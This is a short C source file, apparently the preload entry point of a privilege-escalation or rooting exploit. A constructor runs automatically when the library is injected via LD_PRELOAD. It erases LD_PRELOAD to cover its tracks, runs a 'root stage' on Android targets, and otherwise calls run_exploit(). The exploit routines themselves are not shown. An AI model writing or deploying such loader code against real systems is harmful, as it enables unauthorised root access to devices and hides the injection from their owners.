#include "common.h"

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");

#ifdef ANDROID_TARGET
  if (getenv("ROOT_STAGE")) {
    _exit(do_root_stage());
    return;
  }
#endif  

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
